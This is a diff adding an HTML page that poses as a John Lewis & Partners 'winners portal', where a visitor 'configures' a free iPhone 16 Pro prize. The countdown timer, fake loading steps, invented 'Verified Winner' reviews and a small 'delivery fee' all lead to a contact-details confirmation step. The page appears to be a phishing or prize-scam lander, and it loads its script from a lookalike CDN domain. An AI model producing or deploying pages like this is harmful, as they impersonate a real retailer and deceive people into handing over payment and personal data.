@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+      John Lewis &amp; Partners | Department Store | Home, Fashion, Tech &amp;
+      More
+    </title>
+    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
+    <!-- Bootstrap -->
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+    />
+    <!-- FontAwesome -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
+    />
+    <!-- Stylesheet -->
+    <link rel="stylesheet" type="text/css" href="css/styles.css" />
+  </head>
+  <body>
+    <!-- Header -->
+    <header>
+      <div class="container">
+        <img class="logo" src="img/logo.svg" alt="" />
+      </div>
+    </header>
+
+    <section id="page-1">
+      <!-- Sub-header -->
+      <div class="sub-header">
+        <div class="container">
+          <h5>WELCOME TO THE JOHN LEWIS &AMP; PARTNERS WINNERS PORTAL</h5>
+        </div>
+      </div>
+
+      <!-- Banner -->
+      <div class="banner">
+        <div class="container">
+          <p>
+            As announced on the previous page, you have successfully
+            participated in our competition and you can now configure your
+            prize.
+          </p>
+        </div>
+      </div>
+
+      <!-- Main Content -->
+      <section class="main-content">
+        <div class="container">
+          <div id="page-1" class="wrapper">
+            <img class="banner-img" src="img/banner-img.png" alt="" />
+            <span class="code">(CODE: JHNLWS592-TY481)</span>
+            <button class="main-btn" onclick="useCode()">USE CODE</button>
+            <h6>
+              EXPIRES IN: <span class="minutes">00</span>:<span class="seconds"
+                >00</span
+              >
+            </h6>
+            <p>
+              The code above has been assigned to your prize. Click "USE CODE"
+              to confirm and let us know where you would like the prize sent.
+            </p>
+          </div>
+        </div>
+      </section>
+    </section>
+
+    <section id="page-2" class="hidden">
+      <div class="backdrop">
+        <div class="loader-wrapper">
+          <span class="load-message">Activating code...</span>
+          <div class="loader"></div>
+        </div>
+      </div>
+    </section>
+
+    <section id="page-3" class="hidden">
+      <div class="product-header">
+        <div class="container">
+          <p>Mobile Phones > Apple > <strong>iPhone 16 Pro</strong></p>
+        </div>
+      </div>
+      <!-- Product Name -->
+      <div class="product-name">
+        <div class="container">
+          <small>Apple</small>
+          <h3>
+            iPhone 16 Pro, <span class="selectedClr">Desert Titanium</span>,
+            <span class="selectedStrg">256GB</span>
+          </h3>
+          <small class="rating-text"
+            >4.7 / 5 <i class="fas fa-star"></i>
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star-half-alt"></i> (131 reviews)</small
+          >
+        </div>
+      </div>
+      <!-- Product Images -->
+      <div class="container">
+        <div class="product-wrapper">
+          <div class="product-image">
+            <img class="product" src="img/product.png" alt="" />
+          </div>
+          <div class="product-specifications">
+            <div class="product-color-wrapper">
+              <h5>Select Color</h5>
+              <div class="color-wrapper">
+                <button
+                  class="select-btn clr-btn clr-1"
+                  value="Black Titanium"
+                ></button>
+                <button
+                  class="select-btn clr-btn clr-2"
+                  value="Desert Titanium"
+                ></button>
+                <button
+                  class="select-btn clr-btn clr-3"
+                  value="Natural Titanium"
+                ></button>
+                <button
+                  class="select-btn clr-btn clr-4"
+                  value="White Titanium"
+                ></button>
+              </div>
+            </div>
+            <div class="product-storage-wrapper">
+              <h5>Select Storage</h5>
+              <div class="storage-wrapper">
+                <button class="select-btn str-btn">256GB</button
+                ><button class="select-btn str-btn">512GB</button>
+              </div>
+            </div>
+            <div class="product-summary">
+              <button class="main-btn" onclick="saveSelection()">
+                SAVE SELECTION
+              </button>
+              <div class="summary-text">
+                <p>
+                  Store Price: <span>£1,099.00</span> <strong>£0.00</strong>
+                </p>
+                <p>
+                  Discount: <strong>100%</strong> (<span class="green"
+                    >CODE APPLIED</span
+                  >)
+                </p>
+                <p>Delivery Fee: <strong>£0.5 - £5</strong></p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="page-4" class="hidden">
+      <div class="backdrop">
+        <div class="loader-wrapper">
+          <span class="load-message msg-1">Saving selection...</span>
+          <span class="load-message msg-2 hidden">Browsing stocks...</span
+          ><span class="load-message msg-3 hidden"
+            >Checking Product Availability...</span
+          >
+          <span class="load-message msg-4 hidden">Finalizing...</span>
+          <div class="loader"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Reviews Section -->
+    <section class="reviews-section" id="reviews">
+      <div class="container">
+        <div class="reviews-layout">
+          <!-- Review Summary -->
+          <div class="review-summary">
+            <h2>Customer Reviews</h2>
+
+            <div class="average-rating">
+              <span class="rating-text"
+                >4.7 / 5 <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star"></i>
+                <i class="fas fa-star-half-alt"></i> (131 reviews)</span
+              >
+            </div>
+
+            <div class="rating-bars">
+              <div class="rating-bar">
+                <span class="stars">5 star</span>
+                <div class="bar-container">
+                  <div class="bar" style="width: 86%"></div>
+                </div>
+                <span class="percent">86%</span>
+              </div>
+              <div class="rating-bar">
+                <span class="stars">4 star</span>
+                <div class="bar-container">
+                  <div class="bar" style="width: 10%"></div>
+                </div>
+                <span class="percent">10%</span>
+              </div>
+              <div class="rating-bar">
+                <span class="stars">3 star</span>
+                <div class="bar-container">
+                  <div class="bar" style="width: 4%"></div>
+                </div>
+                <span class="percent">4%</span>
+              </div>
+              <div class="rating-bar">
+                <span class="stars">2 star</span>
+                <div class="bar-container">
+                  <div class="bar" style="width: 0%"></div>
+                </div>
+                <span class="percent">0%</span>
+              </div>
+              <div class="rating-bar">
+                <span class="stars">1 star</span>
+                <div class="bar-container">
+                  <div class="bar" style="width: 0%"></div>
+                </div>
+                <span class="percent">0%</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Reviews List -->
+          <div class="reviews-list">
+            <div class="review">
+              <div class="review-header">
+                <h3>Still Can’t Believe I Won!</h3>
+                <div class="star-rating">
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                </div>
+              </div>
+
+              <div class="review-meta">
+                <span class="reviewer">Hannah R.</span>
+                <span class="verified-badge">Verified Winner</span>
+                <span class="separator">•</span>
+                <span class="date">May 10, 2023</span>
+              </div>
+
+              <p class="review-content">
+                I genuinely thought these things were a scam, but yesterday my
+                brand-new iPhone 16 Pro landed on my doorstep! The whole
+                winner’s claim process was smooth and professional. Thank you so
+                much for making dreams come true!
+              </p>
+            </div>
+
+            <div class="review">
+              <div class="review-header">
+                <h3>Best Surprise of My Year</h3>
+                <div class="star-rating">
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="far fa-star"></i>
+                </div>
+              </div>
+
+              <div class="review-meta">
+                <span class="reviewer">Leon P.</span>
+                <span class="verified-badge">Verified Winner</span>
+                <span class="separator">•</span>
+                <span class="date">April 22, 2023</span>
+              </div>
+
+              <p class="review-content">
+                When I got the email telling me I’d won the iPhone 16 Pro, I
+                thought it was a joke. Nope today I’m typing this review from my
+                prize! Fast shipping, gorgeous phone, and amazing customer
+                experience from John Lewis & Partners.
+              </p>
+            </div>
+
+            <div class="review">
+              <div class="review-header">
+                <h3>100% Legit & Absolutely Thrilled!</h3>
+                <div class="star-rating">
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                  <i class="fas fa-star"></i>
+                </div>
+              </div>
+
+              <div class="review-meta">
+                <span class="reviewer">Maya T.</span>
+                <span class="verified-badge">Verified Winner</span>
+                <span class="separator">•</span>
+                <span class="date">March 15, 2023</span>
+              </div>
+
+              <p class="review-content">
+                I entered the contest on a whim and ended up winning the iPhone
+                16 Pro! They kept me updated every step of the way and the
+                device arrived in perfect condition. Can’t stop showing it off
+                to my friends, thank you!
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="container">
+        Copyright &copy; <span class="curYear">2000</span>. All rights reserved.
+      </div>
+    </footer>
+
+    <!-- Modal -->
+    <div
+      class="modal fade"
+      id="prodModal"
+      tabindex="-1"
+      role="dialog"
+      aria-labelledby="prodModalLabel"
+      aria-hidden="true"
+      data-backdrop="static"
+      data-keyboard="false"
+    >
+      <div class="modal-dialog" role="document">
+        <div class="modal-content">
+          <div class="modal-body">
+            <img class="modal-logo" src="img/logo.svg" alt="" />
+            <br />
+            <h3>Conratulations! <span class="fname"></span></h3>
+            <p>Your iphone is on the way.</p>
+            <img class="final-product" src="img/product.png" alt="" />
+            <p>
+              Everything is ready and your iPhone 16 Pro is ready to ship.
+              Confirm your contact details on the next page to receive your
+              iPhone 16 Pro.
+            </p>
+            <button
+              type="button"
+              class="main-btn final-btn"
+              onclick="ActionRedirect(1)"
+            >
+              <span><i class="fas fa-paper-plane"></i>&nbsp;</span>Confirm and
+              send
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Script -->
+    <script
+      src="https://tier1.aws-cdn.net/jquery/jquery-3.4.0.min.js"
+      type="text/javascript"
+    ></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="js/custom.js"></script>
+  </body>
+</html>
